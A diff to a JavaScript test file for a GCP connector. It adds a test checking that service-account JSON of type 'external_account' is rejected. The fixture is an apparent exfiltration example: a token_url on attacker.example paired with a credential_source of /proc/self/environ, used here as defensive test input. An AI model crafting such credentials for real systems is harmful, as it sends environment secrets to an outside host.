@@ -93,6 +93,13 @@ describe('gcpConnector.scan — config e credenziali', () => {
       .rejects.toThrow(/^\[gcp\] service_account_json parse failed: /)
     await expect(collect(gcpConnector.scan(source({ project_ids: 'proj-a' }), { service_account_json: '[1,2]' })))
       .rejects.toThrow('[gcp] service_account_json parse failed: must be a JSON object')
+    // Review of 23 Sep 2026: external_account credentials make the library
+    // fetch a URL or read a local file and post it to a chosen token_url.
+    const external = { type: 'external_account', token_url: 'https://attacker.example/t', credential_source: { file: '/proc/self/environ' } }
+    await expect(collect(gcpConnector.scan(source({ project_ids: 'proj-a' }), { service_account_json: JSON.stringify(external) })))
+      .rejects.toThrow('[gcp] service_account_json parse failed: type must be "service_account" (a service account key), not "external_account"')
+    await expect(collect(gcpConnector.scan(source({ project_ids: 'proj-a' }), { service_account_json: '{"project_id":"p"}' })))
+      .rejects.toThrow('not null')
     expect(h.ctors).toHaveLength(0)
   })
 
